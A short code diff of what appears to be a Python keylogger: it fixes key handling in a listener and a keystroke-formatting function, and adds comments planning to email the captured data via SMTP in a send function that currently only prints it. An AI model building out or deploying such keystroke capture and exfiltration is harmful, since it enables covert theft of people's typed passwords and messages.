@@ -73,7 +73,7 @@ def release(key):
     :param key: key pressed on the keyboard
     :return: if it were to return false it would be to stop the listener.
     """
-    if key == "Key.escape":
+    if str(key) == "Key.esc":
         return False
 
 
@@ -112,7 +112,7 @@ def parse(key):
     key = key.replace("'", "")  # delete ' ' from output
     if key == "Key.enter" or key == "Key.space":
         return "\n"
-    if Key in key:
+    if "Key" in key:
         return key + " " # if it has a "Key" parameter before add a space so it's more readable
     return key
 
@@ -152,6 +152,9 @@ def results():
 
 
 def send(data, email):
+    # Elad
+    # Send data to mail
+    # SMTP
     print(data)
 
 
